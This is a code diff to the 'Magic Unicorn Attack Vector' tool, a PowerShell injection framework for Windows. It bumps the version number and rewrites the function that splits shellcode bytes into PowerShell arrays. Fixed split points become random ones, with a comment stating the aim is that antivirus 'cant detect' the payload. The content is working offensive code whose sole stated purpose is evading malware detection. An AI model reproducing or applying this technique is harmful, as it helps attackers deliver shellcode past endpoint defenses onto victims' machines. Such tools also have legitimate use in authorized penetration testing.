@@ -429,7 +429,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.2.3 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.2.4 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -470,66 +470,76 @@ def liquify_bytes(bytes, stub):
     bytes = bytes.split(",")
     counter = 0
     a1 = generate_random_string(2,2)
-    assemble = ("$" + a1 +"=@(") 
+    assemble = ("$" + a1 +"=@(")
+
+    # randomize numbers so av cant detect
+    b1 = generate_random_number(100,130)
+    b2 = generate_random_number(200,230)
+    b3 = generate_random_number(300,330)
+    b4 = generate_random_number(400,430)
+    b5 = generate_random_number(500,530)
+    b6 = generate_random_number(600,630)
+    b7 = generate_random_number(700,730)
+ 
     for byte in bytes:
         byte = byte.rstrip()
-        if counter < 100:
-            if counter < 200:
+        if counter < b1:
+            if counter < b2:
                 assemble = assemble + byte + ","
-        if counter >= 100:
-            if counter == 100:
+        if counter >= b1:
+            if counter == b1:
                 a2 = generate_random_string(2,2)
                 assemble = (assemble + ");" + "$" + a2 + "=@(") + byte + ","
 
-            if counter != 100:
-                if counter < 200:
+            if counter != b1:
+                if counter < b2:
                     assemble = assemble + byte + ","
-                if counter >= 200:
-                    if counter == 200:
+                if counter >= b2:
+                    if counter == b2:
                         a3 = generate_random_string(2,2)
                         assemble = (assemble + ");" + "$" + a3 + "=@(") + byte + ","
-                    if counter > 200:
-                        if counter < 300:
+                    if counter > b2:
+                        if counter < b3:
                             assemble = assemble + byte + ","
 
-                        if counter >= 300:
-                            if counter == 300:
+                        if counter >= b3:
+                            if counter == b3:
                                 a4 = generate_random_string(2,2)
                                 assemble = (assemble + ");" + "$" + a4 + "=@(") + byte + ","
-                            if counter != 300:
+                            if counter != b3:
                                 assemble = assemble + byte + ","
 
-                    if counter > 400:
-                        if counter < 500:
+                    if counter > b4:
+                        if counter < b5:
                             assemble = assemble + byte + ","
 
-                        if counter >= 500:
-                            if counter == 500:
+                        if counter >= b5:
+                            if counter == b5:
                                 a5 = generate_random_string(2,2)
                                 assemble = (assemble + ");" + "$" + a5 + "=@(") + byte + ","
-                            if counter != 500:
+                            if counter != b5:
                                 assemble = assemble + byte + ","
 
-                    if counter > 500:
-                        if counter < 600:
+                    if counter > b5:
+                        if counter < b6:
                             assemble = assemble + byte + ","
 
-                        if counter >= 600:
-                            if counter == 600:
+                        if counter >= b6:
+                            if counter == b6:
                                 a6 = generate_random_string(2,2)
                                 assemble = (assemble + ");" + "$" + a6 + "=@(") + byte + ","
-                            if counter != 600:
+                            if counter != b6:
                                 assemble = assemble + byte + ","
 
-                    if counter > 600:
-                        if counter < 700:
+                    if counter > b6:
+                        if counter < b7:
                             assemble = assemble + byte + ","
 
-                        if counter >= 700:
-                            if counter == 700:
+                        if counter >= b7:
+                            if counter == b7:
                                 a7 = generate_random_string(2,2)
                                 assemble = (assemble + ");" + "$" + a7 + "=@(") + byte + ","
-                            if counter != 700:
+                            if counter != b7:
                                 assemble = assemble + byte + ","
 
         counter = counter + 1
